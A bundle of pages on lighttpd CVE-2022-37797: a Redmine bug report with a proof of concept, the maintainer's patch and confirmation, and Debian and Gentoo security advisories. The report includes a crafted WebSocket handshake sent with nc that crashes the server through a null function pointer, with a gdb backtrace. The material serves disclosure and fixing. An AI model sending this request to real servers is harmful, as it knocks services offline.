=== Content from redmine.lighttpd.net_320276ac_20250114_221728.html ===


Search

### Project

### General

### Profile

* [Sign in](/login)
* [Register](/account/register)

* [Home](/)
* [Projects](/projects)
* [Donate](/paypal_donation)
* [Help](https://www.redmine.org/guide)

[Search](/projects/lighttpd/search?scope=subprojects):

 Lighttpd[All Projects](/projects?jump=issues)
# Lighttpd

* [Overview](/projects/lighttpd)
* [Activity](/projects/lighttpd/activity)
* [Roadmap](/projects/lighttpd/roadmap)
* [Issues](/projects/lighttpd/issues)
* [News](/projects/lighttpd/news)
* [Wiki](/projects/lighttpd/wiki)
* [Forums](/projects/lighttpd/boards)
* [Repository](/projects/lighttpd/repository)
* [Blog](https://www.lighttpd.net)
* [Developer Blog](https://blog.lighttpd.net)

### Custom queries

* [lighttpd 1.4 open issues](/projects/lighttpd/issues?query_id=15)
* [Open issues without target version](/projects/lighttpd/issues?query_id=16)

Actions
Copy link
## Bug #3165

closed

### mod\_wstunnel null pointer dereference

Added by [mmmds](/users/14493) [over 2 years](/projects/lighttpd/activity?from=2022-08-02 "2022-08-02 21:14") ago.
Updated [over 2 years](/projects/lighttpd/activity?from=2022-08-03 "2022-08-03 05:45") ago.

Status:FixedPriority:NormalCategory:-Target version:[1.4.66](/versions/68 "2022-08-07")
ASK QUESTIONS IN Forums:No

---

**Description**

There's a null pointer dereference bug that crashes the whole server if mod\_wstunnel is enabled and the server receives invalid HTTP Websocket Handshake request. This issue could be abused by a remote attacker to cause Denial of Service condition.

The vulnerability was detected on Ubuntu 22.04 x86\_64:
- lighttpd 1.4.65 built from source
- lighttpd 1.4.63 installed from ubuntu repository
- lighttpd 1.4.66 from github (master, 5d80e41ab2585288b0bbe0ebf8f3e3b120a0f403)

In the "wstunnel\_handler\_setup" function, the server verifies a request and if it's valid, it initializes handler functions. If the request has invalid (not a number) value in the "Sec-WebSocket-Version" header, it sets http status to 400 and exits the function without setting "hctx->create\_env" function pointer. Then, the server reaches to the "gw\_write\_request" function where it tries to call "hctx->create\_env(hctx)", however, the "hctx->create\_env" value is null leading to crash.

mod\_wstunnel.c:
```
static handler_t wstunnel_handler_setup (request_st * const r, plugin_data * const p) {
    handler_ctx *hctx = r->plugin_ctx[p->id];
    int hybivers;
    hctx->errh = r->conf.errh;/*(for mod_wstunnel-specific DEBUG_* macros)*/
    hctx->conf = p->conf; /*(copies struct)*/
    hybivers = wstunnel_check_request(r, hctx);
    if (hybivers < 0) return HANDLER_FINISHED;
   [...]
    hctx->gw.create_env       = wstunnel_create_env;
    hctx->gw.handler_ctx_free = wstunnel_handler_ctx_free;

```

```
static int wstunnel_check_request(request_st * const r, handler_ctx * const hctx) {
    const buffer * const vers =
      http_header_request_get(r, HTTP_HEADER_OTHER, CONST_STR_LEN("Sec-WebSocket-Version"));
    const long hybivers = (NULL != vers)
      ? light_isdigit(*vers->ptr) ? strtol(vers->ptr, NULL, 10) : -1
      : 0;
    if (hybivers < 0 || hybivers > INT_MAX) {
        DEBUG_LOG_ERR("%s", "invalid Sec-WebSocket-Version");
        r->http_status = 400; /* Bad Request */
        return -1;
    }

```

gw\_backend.c:
```
static handler_t gw_write_request(gw_handler_ctx * const hctx, request_st * const r) {
    switch(hctx->state) {
[...]
    case GW_STATE_PREPARE_WRITE:
        /* ok, we have the connection */

        {
            handler_t rc = hctx->create_env(hctx);
            if (HANDLER_GO_ON != rc) {

```

**PoC:**

1. Download and build the server from source:
```

$ wget https://download.lighttpd.net/lighttpd/releases-1.4.x/lighttpd-1.4.65.tar.gz
$ tar zxf lighttpd-1.4.65.tar.gz
$ cd lighttpd-1.4.65/
$ cmake -DCMAKE_INSTALL_PREFIX=/usr/local -Wno-dev .
$ make -j 4
$ sudo make install

```

2. Prepare configuration

/home/osboxes/echo.pl:
```

#!/usr/bin/perl -Tw
$SIG{PIPE} = 'IGNORE';
for (my $FH; accept($FH, STDIN); close $FH) {
    select($FH); $|=1; # $FH->autoflush;
    print $FH $_ while (<$FH>);
}

```

/home/osboxes/webroot/ws.html:
```

<!DOCTYPE html>
<!-- modified from example in https://github.com/joewalnes/websocketd README.md -->
<pre id="log"></pre>
    <script>
          // helper function: log message to screen
          var logelt = document.getElementById('log');
  function log(msg) { logelt.textContent += msg + '\n'; }
  // helper function: send websocket msg with count (1 .. 5)
  var ll = 0;
  function send_msg() { if (++ll <= 5) { log('SEND: '+ll); ws.send(ll+'\n'); } }
  // setup websocket with callbacks
  var ws = new WebSocket('ws://localhost:3000/ws/');
  ws.onopen = function()         { log('CONNECT\n'); send_msg(); };
  ws.onclose = function()        { log('DISCONNECT'); };
  ws.onmessage = function(event) { log('RECV: ' + event.data); send_msg(); };
    </script>

```

/home/osboxes/server.conf:
```

server.document-root = "/home/osboxes/webroot"
server.port = 3000
mimetype.assign = (
  ".html" => "text/html",
)

server.modules += ("mod_wstunnel")
wstunnel.server = (
  "/ws/" => (
    (
      "socket" => "/dev/shm/psock",
      "bin-path" => "/home/osboxes/echo.pl",
      "max-procs" => 1
    )
  )
)

```

3. Run the server
```

$ lighttpd -D -f ~/server.conf

```

4. Optional - open a website in a browser to confirm that websocket configuration works
```

$ firefox http://localhost:3000/ws.html

```

5. Optional - send valid request
```

$ echo -e "GET /ws/ HTTP/1.1\r\nHost: localhost\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Extensions: permessage-deflate\r\nSec-WebSocket-Key: FCM5bSXLZW322otNERLYNA==\r\nConnection: keep-alive, Upgrade\r\nSec-Fetch-Dest: websocket\r\nSec-Fetch-Mode: websocket\r\nSec-Fetch-Site: same-origin\r\nUpgrade: websocket\r\n\r\n" | nc -v 127.0.0.1 3000
Connection to 127.0.0.1 3000 port [tcp/*] succeeded!
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Sec-WebSocket-Accept: vdMhuNAtgTQZJEwrIEBtPElq0RM=
Connection: upgrade
Date: Tue, 02 Aug 2022 20:40:38 GMT
Server: lighttpd/1.4.65

```

6. Send invalid request (`Sec-WebSocket-Version: x`) - crash the server
```

$ echo -e "GET /ws/ HTTP/1.1\r\nHost: localhost\r\nSec-WebSocket-Version: x\r\nSec-WebSocket-Extensions: permessage-deflate\r\nSec-WebSocket-Key: FCM5bSXLZW322otNERLYNA==\r\nConnection: keep-alive, Upgrade\r\nSec-Fetch-Dest: websocket\r\nSec-Fetch-Mode: websocket\r\nSec-Fetch-Site: same-origin\r\nUpgrade: websocket\r\n\r\n" | nc -v 127.0.0.1 3000
Connection to 127.0.0.1 3000 port [tcp/*] succeeded!
HTTP/1.1 400 Bad Request
Transfer-Encoding: chunked
Date: Tue, 02 Aug 2022 20:41:13 GMT
Server: lighttpd/1.4.65

```

```

$ lighttpd -D -f server.conf
2022-08-02 16:39:44: (/home/osboxes/lighttpd-1.4.65/src/server.c.1588) server started (lighttpd/1.4.65)
    Segmentation fault (core dumped)

```
```

$ gdb --args lighttpd -D -f server.conf
(gdb) r
Starting program: /usr/local/sbin/lighttpd -D -f server.conf
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
2022-08-02 16:41:47: (/home/osboxes/lighttpd-1.4.65/src/server.c.1588) server started (lighttpd/1.4.65)

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) up
#1  0x000055555559d75e in gw_write_request (hctx=0x5555555e3fd0, r=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/gw_backend.c:1993
1993                handler_t rc = hctx->create_env(hctx);
(gdb) print hctx->create_env
$1 = (handler_t (*)(struct gw_handler_ctx *)) 0x0
(gdb) bt
#0  0x0000000000000000 in ?? ()
#1  0x000055555559d75e in gw_write_request (hctx=0x5555555e3fd0, r=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/gw_backend.c:1993
#2  0x000055555559dd27 in gw_send_request (hctx=0x5555555e3fd0, r=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/gw_backend.c:2154
#3  0x000055555559e1f6 in gw_handle_subrequest (r=0x5555555e1230, p_d=0x5555555db1f0) at /home/osboxes/lighttpd-1.4.65/src/gw_backend.c:2264
#4  0x000055555556a857 in connection_handle_write_state (r=0x5555555e1230, con=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/connections.c:473
#5  0x000055555556bd67 in connection_state_machine_loop (r=0x5555555e1230, con=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/connections.c:1028
#6  0x000055555556c805 in connection_state_machine_h1 (con=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/connections.c:1341
#7  0x000055555556c87d in connection_state_machine (con=0x5555555e1230) at /home/osboxes/lighttpd-1.4.65/src/connections.c:1356
#8  0x0000555555566b4c in server_run_con_queue (joblist=0x5555555e1230, sentinel=0x5555555d3b60 <log_con_jqueue>) at /home/osboxes/lighttpd-1.4.65/src/server.c:1958
#9  0x0000555555566c95 in server_main_loop (srv=0x5555555d5540) at /home/osboxes/lighttpd-1.4.65/src/server.c:2011
#10 0x0000555555566e86 in main (argc=4, argv=0x7fffffffe138) at /home/osboxes/lighttpd-1.4.65/src/server.c:2085

```

Discovered by Michał Dardas

* [History](/issues/3165?tab=history)
* [Notes](/issues/3165?tab=notes)
* [Property changes](/issues/3165?tab=properties)
* [Associated revisions](/issues/3165?tab=changesets)

ActionsCopy link
[#1](#note-1)
#### Updated by [gstrauss](/users/10519) [over 2 years](/projects/lighttpd/activity?from=2022-08-03 "2022-08-03 04:43") ago

* **Status** changed from *New* to *Patch Pending*
* **Target version** changed from *1.4.xx* to *1.4.66*

Thank you for the detailed bug report. How would you / Michał Dardas like to be credited in the commit message?

The following is a quick patch, but I am tracing the code to see if there might be a better patch.
```

--- a/src/mod_wstunnel.c
+++ b/src/mod_wstunnel.c
@@ -485,7 +485,10 @@ static handler_t wstunnel_handler_setup (request_st * const r, plugin_data * con
     hctx->errh = r->conf.errh;/*(for mod_wstunnel-specific DEBUG_* macros)*/
     hctx->conf = p->conf; /*(copies struct)*/
     hybivers = wstunnel_check_request(r, hctx);
-    if (hybivers < 0) return HANDLER_FINISHED;
+    if (hybivers < 0) {
+        r->handler_module = NULL;
+        return HANDLER_FINISHED;
+    }
     hctx->hybivers = hybivers;
     if (0 == hybivers) {
         DEBUG_LOG_INFO("WebSocket Version = %s", "hybi-00");

```

ActionsCopy link
[#2](#note-2)
#### Updated by [mmmds](/users/14493) [over 2 years](/projects/lighttpd/activity?from=2022-08-03 "2022-08-03 04:59") ago

Please credit me as Michał Dardas.

ActionsCopy link
[#3](#note-3)
#### Updated by [gstrauss](/users/10519) [over 2 years](/projects/lighttpd/activity?from=2022-08-03 "2022-08-03 05:28") ago

How does this look to you? <https://git.lighttpd.net/lighttpd/lighttpd1.4/commit/971773f1fae600074b46ef64f3ca1f76c227985f>

I checked other modules in lighttpd and mod\_wstunnel was the only one with this bug.

Technical details: if a module is going to handle a request and generate a response (even an error response), then the module sets r->handler\_module. If r->handler\_module is set, then the module must configure anything else it needs to handle the request, e.g. `hctx->create_env`, which was not happening in mod\_wstunnel for a bad hybivers. Since mod\_wstunnel did not intend for mod\_wstunnel to generate an error response in that case, the patch above unsets r->handler\_module to let the base lighttpd generate an error response.

ActionsCopy link
[#4](#note-4)
#### Updated by [mmmds](/users/14493) [over 2 years](/projects/lighttpd/activity?from=2022-08-03 "2022-08-03 05:38") ago

It looks good. I've tried the patch, the crash no longer occurs.

ActionsCopy link
[#5](#note-5)
#### Updated by [gstrauss](/users/10519) [over 2 years](/projects/lighttpd/activity?from=2022-08-03 "2022-08-03 05:45") ago

* **Status** changed from *Patch Pending* to *Fixed*

Applied in changeset [971773f1fae600074b46ef64f3ca1f76c227985f](/projects/lighttpd/repository/14/revisions/971773f1fae600074b46ef64f3ca1f76c227985f "[mod_wstunnel] fix crash with bad hybivers (fixes #3165) (thx Michał Dardas) x-ref:   \"mod_wstu...").

Actions
Copy link

Also available in: [Atom](/issues/3165.atom)

Powered by [Redmine](https://www.redmine.org/) © 2006-2024 Jean-Philippe Lang

Loading...



=== Content from lists.debian.org_fe96f5ad_20250114_221727.html ===


---

[[Date Prev](msg00001.html)][[Date Next](msg00003.html)]
[[Thread Prev](msg00001.html)][[Thread Next](msg00003.html)]
[[Date Index](maillist.html#00002)]
[[Thread Index](threads.html#00002)]

# [SECURITY] [DLA 3133-1] lighttpd security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3133-1] lighttpd security update
* *From*: Helmut Grohne <helmut@subdivi.de>
* *Date*: Mon, 3 Oct 2022 09:47:47 +0200
* *Message-id*: <[[🔎]](/msgid-search/YzqToxff81ZsgLtJ%40alf.mars) [YzqToxff81ZsgLtJ@alf.mars](msg00002.html)>
* *Mail-followup-to*: Helmut Grohne <helmut@subdivi.de>, debian-lts-announce@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3133-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Helmut Grohne
October 03, 2022                              <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : lighttpd
Version        : 1.4.53-4+deb10u3
CVE ID         : CVE-2022-37797

An invalid HTTP request (websocket handshake) may cause a NULL
pointer dereference in the wstunnel module.

For Debian 10 buster, this problem has been fixed in version
1.4.53-4+deb10u3.

We recommend that you upgrade your lighttpd packages.

For the detailed security status of lighttpd please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/lighttpd>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpQvLGpKqITp.pgp)**

*Description:* PGP signature

---



=== Content from security.gentoo.org_c31bebcc_20250114_221728.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Lighttpd: Denial of Service — GLSA **202210-12**

A vulnerability has been discovered in lighttpd which could result in denial of service.

### Affected packages

| Package | **www-servers/lighttpd** on all architectures |
| --- | --- |
| Affected versions | < **1.4.67** |
| Unaffected versions | >= **1.4.67** |

### Background

Lighttpd is a lightweight high-performance web server.

### Description

Lighttpd's mod\_wstunnel does not initialize a handler function pointer if an invalid HTTP request (websocket handshake) is received.

### Impact

An attacker can trigger a denial of service via making Lighttpd try to call an uninitialized function pointer.

### Workaround

There is no known workaround at this time.

### Resolution

All lighttpd users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-servers/lighttpd-1.4.67"

```
### References

* [CVE-2022-37797](https://nvd.nist.gov/vuln/detail/CVE-2022-37797)
* [CVE-2022-41556](https://nvd.nist.gov/vuln/detail/CVE-2022-41556)

**Release date**

October 31, 2022

**Latest revision**

October 31, 2022: 1

**Severity**

low

**Exploitable**

remote

**Bugzilla entries**

* [869890](https://bugs.gentoo.org/show_bug.cgi?id=869890)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.debian.org_9f4113a6_20250114_221728.html ===


---

[[Date Prev](msg00211.html)][[Date Next](msg00213.html)]
[[Thread Prev](msg00211.html)][[Thread Next](msg00213.html)]
[[Date Index](maillist.html#00212)]
[[Thread Index](threads.html#00212)]

# [SECURITY] [DSA 5243-1] lighttpd security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5243-1] lighttpd security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Wed, 28 Sep 2022 16:05:19 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1odZYl-00C9EO-Kv%40seger.debian.org) [E1odZYl-00C9EO-Kv@seger.debian.org](msg00212.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5243-1                   security@debian.org
<https://www.debian.org/security/>                            Helmut Grohne
September 28, 2022                    <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : lighttpd
CVE ID         : CVE-2022-37797 CVE-2022-41556

Several vulnerabilities were discovered in lighttpd, a fast webserver
with minimal memory footprint.

CVE-2022-37797

    An invalid HTTP request (websocket handshake) may cause a NULL
    pointer dereference in the wstunnel module.

CVE-2022-41556

    A resource leak in mod_fastcgi and mod_scgi could lead to a denial
    of service after a large number of bad HTTP requests.

For the stable distribution (bullseye), these problems have been fixed in
version 1.4.59-1+deb11u2.

We recommend that you upgrade your lighttpd packages.

For the detailed security status of lighttpd please refer to its
security tracker page at:
<https://security-tracker.debian.org/tracker/lighttpd>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmM0cCVfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0TU5Q/9Ha7yNcTtRk9Dzmt6zwLSp2OVcyiURMKsZgWYuXjJdvA4LZI6WqU85OEn
DCeXHA4YTCi6yZBsQy4HdQ0DBcxJGAKVsyMegKJew3WLxs7Cp4ik/moVkrDdaIWP
1YlzbGTgVWdWl8P1hVr8onJP5PN+6in2Ib89+CPexqxJ91uYz01gzCQuzhJk/AdE
Vbchn8fNTHqpIkjeZOrm4daKoHzgX4DP4tgxVbpHstNMsojJ2p03cBFs3k3pZVD+
JNWiEFrgXU+Lj9iQi3u/LH6xYYkAFw12oK4rJnP73L9wfZa+Ak4UyFXvpSTp5vyN
z6jNYPZt2fZVQjG5zaZ1NEpnUQImA0kGlttGz15/BzB03Dy+5Tr5uRL1mwH/z06y
aT26ZCC8TWUhnaqN3ZrneekUmMbOaQmzR7f+z9EZcaWGKdYyyLkMx46Ws+Q4blnf
TUqoN1Sphzt6JcGqTEKRe89YS+AsYP1Q1u4JUIHfPxc++0+myh6VJ0U+NR5rihgl
4qqXlhiYHTrQ748Kli2e8i3Q4osoRmdGIbLl4gttCX4r88CdKOHmCXx7GccS13Vq
iYTVtX5vXnY08MhbWOJjqRqIxeN8ou26yBGtrkzixD+Dee26fZIx/Nk5LGU05Ld3
rpuAjg13gckqLn/p9hc5OLB+NNQ3YhOwXbkkmSuwNxToy/aO2q0=
=usZG
-----END PGP SIGNATURE-----

```

---


